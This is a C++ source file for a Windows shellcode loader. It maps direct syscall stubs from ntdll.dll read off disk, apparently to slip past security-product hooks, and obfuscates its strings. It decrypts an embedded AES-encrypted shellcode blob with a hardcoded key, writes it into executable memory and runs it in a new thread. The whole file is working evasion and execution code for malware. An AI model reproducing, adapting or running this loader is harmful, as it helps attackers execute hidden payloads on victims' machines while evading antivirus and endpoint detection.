#include <Windows.h>
#include <iostream>
#include <string>
#include <sstream> 
#include "structures.h"
#include "structs.h"
#include "obfuscate.h"

#define STATUS_SUCCESS 0

using namespace std;

int const SYSCALL_STUB_SIZE = 21;

MyNtOpenProcess _NtOpenProcess = NULL;
char OpenProcStub[SYSCALL_STUB_SIZE] = {};

MyNtAllocateVirtualMemory _NtAllocateVirtualMemory = NULL;
char AllocStub[SYSCALL_STUB_SIZE] = {};

MyNtWriteVirtualMemory _NtWriteVirtualMemory = NULL;
char WVMStub[SYSCALL_STUB_SIZE] = {};

MyNtCreateThreadEx _NtCreateThreadEx = NULL;
char CreateThreadExStub[SYSCALL_STUB_SIZE];

MyNtWaitForSingleObject _NtWaitForSingleObject = NULL;
char WaitForSingleObjectStub[SYSCALL_STUB_SIZE] = {};

PVOID RVAtoRawOffset(DWORD_PTR RVA, PIMAGE_SECTION_HEADER section)
{
	return (PVOID)(RVA - section->VirtualAddress + section->PointerToRawData);
}

BOOL MapSyscall(LPCSTR functionName, PIMAGE_EXPORT_DIRECTORY exportDirectory, LPVOID fileData, PIMAGE_SECTION_HEADER textSection, PIMAGE_SECTION_HEADER rdataSection, LPVOID syscallStub)
{
	PDWORD addressOfNames = (PDWORD)RVAtoRawOffset((DWORD_PTR)fileData + *(&exportDirectory->AddressOfNames), rdataSection);
	PDWORD addressOfFunctions = (PDWORD)RVAtoRawOffset((DWORD_PTR)fileData + *(&exportDirectory->AddressOfFunctions), rdataSection);

	for (size_t i = 0; i < exportDirectory->NumberOfNames; i++)
	{
		DWORD_PTR functionNameVA = (DWORD_PTR)RVAtoRawOffset((DWORD_PTR)fileData + addressOfNames[i], rdataSection);
		DWORD_PTR functionVA = (DWORD_PTR)RVAtoRawOffset((DWORD_PTR)fileData + addressOfFunctions[i + 1], textSection);
		LPCSTR functionNameResolved = (LPCSTR)functionNameVA;
		if (strcmp(functionNameResolved, functionName) == 0)
		{
			memcpy(syscallStub, (LPVOID)functionVA, SYSCALL_STUB_SIZE);
			return TRUE;
		}
	}

	return FALSE;
}

BOOL FindAlloc(PIMAGE_EXPORT_DIRECTORY exportDirectory, LPVOID fileData, PIMAGE_SECTION_HEADER textSection, PIMAGE_SECTION_HEADER rdataSection)
{
	DWORD oldProtection;
	_NtAllocateVirtualMemory = (MyNtAllocateVirtualMemory)(LPVOID)AllocStub;
	VirtualProtect(AllocStub, SYSCALL_STUB_SIZE, PAGE_EXECUTE_READWRITE, &oldProtection);

	if (MapSyscall(AY_OBFUSCATE("NtAllocateVirtualMemory"), exportDirectory, fileData, textSection, rdataSection, AllocStub))
	{
		return TRUE;
	}
	return FALSE;
}

BOOL FindWriteVirtualMemory(PIMAGE_EXPORT_DIRECTORY exportDirectory, LPVOID fileData, PIMAGE_SECTION_HEADER textSection, PIMAGE_SECTION_HEADER rdataSection)
{
	DWORD oldProtection;
	_NtWriteVirtualMemory = (MyNtWriteVirtualMemory)(LPVOID)WVMStub;
	VirtualProtect(WVMStub, SYSCALL_STUB_SIZE, PAGE_EXECUTE_READWRITE, &oldProtection);

	if (MapSyscall(AY_OBFUSCATE("NtWriteVirtualMemory"), exportDirectory, fileData, textSection, rdataSection, WVMStub))
	{
		return TRUE;
	}
	return FALSE;
}

BOOL FindCreateThreadEx(PIMAGE_EXPORT_DIRECTORY exportDirectory, LPVOID fileData, PIMAGE_SECTION_HEADER textSection, PIMAGE_SECTION_HEADER rdataSection)
{
	DWORD oldProtection;
	_NtCreateThreadEx = (MyNtCreateThreadEx)(LPVOID)CreateThreadExStub;
	VirtualProtect(CreateThreadExStub, SYSCALL_STUB_SIZE, PAGE_EXECUTE_READWRITE, &oldProtection);

	if (MapSyscall(AY_OBFUSCATE("NtCreateThreadEx"), exportDirectory, fileData, textSection, rdataSection, CreateThreadExStub))
	{
		return TRUE;
	}

	return FALSE;
}

BOOL FindWaitForSingleObject(PIMAGE_EXPORT_DIRECTORY exportDirectory, LPVOID fileData, PIMAGE_SECTION_HEADER textSection, PIMAGE_SECTION_HEADER rdataSection)
{
	DWORD oldProtection;
	_NtWaitForSingleObject = (MyNtWaitForSingleObject)(LPVOID)WaitForSingleObjectStub;
	VirtualProtect(WaitForSingleObjectStub, SYSCALL_STUB_SIZE, PAGE_EXECUTE_READWRITE, &oldProtection);

	if (MapSyscall(AY_OBFUSCATE("NtWaitForSingleObject"), exportDirectory, fileData, textSection, rdataSection, WaitForSingleObjectStub))
	{
		return TRUE;
	}

	return FALSE;
}

BOOL EstablishSyscalls()
{
	LPVOID fileData = NULL;
	HANDLE file = NULL;
	DWORD fileSize = NULL;
	DWORD bytesRead = NULL;
	BOOL success = TRUE;

	file = CreateFileA(AY_OBFUSCATE("c:\\windows\\system32\\ntdll.dll"), GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	fileSize = GetFileSize(file, NULL);
	fileData = HeapAlloc(GetProcessHeap(), 0, fileSize);
	if (!ReadFile(file, fileData, fileSize, &bytesRead, NULL))
		return FALSE;

	PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)fileData;
	PIMAGE_NT_HEADERS imageNTHeaders = (PIMAGE_NT_HEADERS)((DWORD_PTR)fileData + dosHeader->e_lfanew);
	DWORD exportDirRVA = imageNTHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
	PIMAGE_SECTION_HEADER section = IMAGE_FIRST_SECTION(imageNTHeaders);
	PIMAGE_SECTION_HEADER textSection = section;
	PIMAGE_SECTION_HEADER rdataSection = section;

	for (int i = 0; i < imageNTHeaders->FileHeader.NumberOfSections; i++)
	{
		if (strcmp((CHAR*)section->Name, (CHAR*)AY_OBFUSCATE(".rdata")) == 0) {
			rdataSection = section;
			break;
		}
		section++;
	}

	PIMAGE_EXPORT_DIRECTORY exportDirectory = (PIMAGE_EXPORT_DIRECTORY)RVAtoRawOffset((DWORD_PTR)fileData + exportDirRVA, rdataSection);

	// Assign Syscall values
	if (!FindAlloc(exportDirectory, fileData, textSection, rdataSection))
		success = FALSE;
	if (!FindWriteVirtualMemory(exportDirectory, fileData, textSection, rdataSection))
		success = FALSE;
	if (!FindCreateThreadEx(exportDirectory, fileData, textSection, rdataSection))
		success = FALSE;
	if (!FindWaitForSingleObject(exportDirectory, fileData, textSection, rdataSection))
		success = FALSE;

	if (file)
	{
		CloseHandle(file);
		file = NULL;
	}

	if (success)
		return TRUE;

	return FALSE;

}

int main(int argc, char* argv[])
{
	HANDLE hProc = INVALID_HANDLE_VALUE;
	HANDLE hRemoteThread = INVALID_HANDLE_VALUE;
	LPVOID lpAllocationStart = nullptr;
	DWORD oldProtect;

	string key_s = (string)AY_OBFUSCATE("Password");
	unsigned char buf[] =
        "\xd4\xec\x0a\x8f\x6c\x95\xb5\x70\x16\x34\x59\xdd\x8a\xc9"
        "\x47\xf7\x29\x12\x9e\x90\xd7\x82\x2d\x2f\x9c\x06\x01\x82"
        "\x3f\x4d\x75\x69\xb3\x91\xfb\x21\x40\x8f\x60\x54\xcd\x33"
        "\xa4\x58\x88\x7b\xa8\xe1\x10\xee\x84\x5e\x06\x4f\x74\xb6"
        "\xb2\xd8\x2a\x78\x21\x74\x1c\xad\x69\xd9\xc3\xea\x99\xf6"
        "\x66\x83\xba\x6e\xae\x4b\x97\xdc\xce\x11\x39\x27\x4c\xbe"
        "\x0c\xcd\xa9\x0a\x34\x57\x3d\x98\xc4\xcb\xdd\x18\x84\x30"
        "\xfe\xf6\x89\xd4\x25\x15\x57\x40\xb8\x3a\xcd\x9e\xac\xe2"
        "\x54\x4f\x57\x61\xe6\x2e\x0e\x1f\x22\x20\xdf\xa1\xf6\x9a"
        "\xb6\x7a\xad\xfd\x1c\x34\xa7\xcd\x37\x98\x96\xe8\xd9\x80"
        "\x97\x19\x17\x8f\xc7\xf4\x30\x38\x7c\x2c\x36\xee\x42\x6f"
        "\x7c\x00\x35\x7b\x92\x54\xfb\xc7\x85\x38\x0a\x79\x8c\xcd"
        "\x11\x64\x5a\xae\xeb\x8c\x0b\x9b\xb0\x6f\x6e\xbe\x66\x0b"
        "\x33\x82\xcf\x66\x7a\x29\x8a\x96\xa6\x6d\x53\xeb\x8d\x02"
        "\x19\x89\xc7\xc0\x33\x4d\x0c\x5d\x13\x30\x76\x60\x07\x26"
        "\xd6\xc9\x4f\x06\x0f\x66\x64\x45\x5d\xd3\xaf\xcc\x44\x4c"
        "\x61\x01\xc5\x80\xd6\x81\xa1\x58\x84\x8e\x53\x21\x7f\xae"
        "\x40\x8b\xfd\xa1\xb0\x98\xd3\x9b\x74\x15\x9b\xa8\xaa\xc2"
        "\x72\x09\xd3\xc4\x3a\x8a\x29\xfc\x49\xaa\x08\x0d\x1c\xab"
        "\x7b\x79\x95\xa1\x71\xd2\x05\x7a\x24\xce\x5b\x00\xe1\x34"
        "\x80\x3d\xd9\x56\x02\x1f\xab\x9f";

	SIZE_T szAllocation = sizeof buf - 1;

	while (key_s.length() < 16) {
		key_s += "0";
	}
	const char* cstr = key_s.c_str();
	istringstream iss(cstr);
	unsigned char key[17];
	iss >> key;
	unsigned char expandedKey[176];
	KeyExpansion(key, expandedKey);
	unsigned char* shellcode = new unsigned char[szAllocation];
	for (int i = 0; i < szAllocation; i += 16) {
		AESDecrypt(buf + i, expandedKey, shellcode + i);
	}

	if (!EstablishSyscalls())
		return 1; 

	hProc = ((HANDLE)(LONG_PTR)-1);

	printf(AY_OBFUSCATE("Allocating %d bytes\n"), szAllocation);
	NTSTATUS status = _NtAllocateVirtualMemory(hProc, &lpAllocationStart, 0, &szAllocation, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	if (status != STATUS_SUCCESS)
	{
		printf(AY_OBFUSCATE("Failed to allocate memory\n"));
		return FALSE;
	}

	printf(AY_OBFUSCATE("Writing shellcode to 0x%p\n"), lpAllocationStart);
	status = _NtWriteVirtualMemory(hProc, lpAllocationStart, (PVOID)shellcode, szAllocation, NULL);
	if (status != STATUS_SUCCESS)
	{
		printf(AY_OBFUSCATE("Failed to write to allocated memory\n"));
		return FALSE;
	}

	printf(AY_OBFUSCATE("Creating thread\n"));
	status = _NtCreateThreadEx(&hRemoteThread, PROCESS_ALL_ACCESS, NULL, hProc, (LPTHREAD_START_ROUTINE)lpAllocationStart, NULL, FALSE, 0, 0, 0, NULL);

	_NtWaitForSingleObject(hRemoteThread, FALSE, NULL);

	if (hRemoteThread)
		CloseHandle(hRemoteThread);
	if (hProc)
		CloseHandle(hProc);

	if (status != STATUS_SUCCESS)
	{
		printf(AY_OBFUSCATE("CreateRemoteThread failed\n"));
		return FALSE;
	}

	printf(AY_OBFUSCATE("Success!"));
	return 0;

}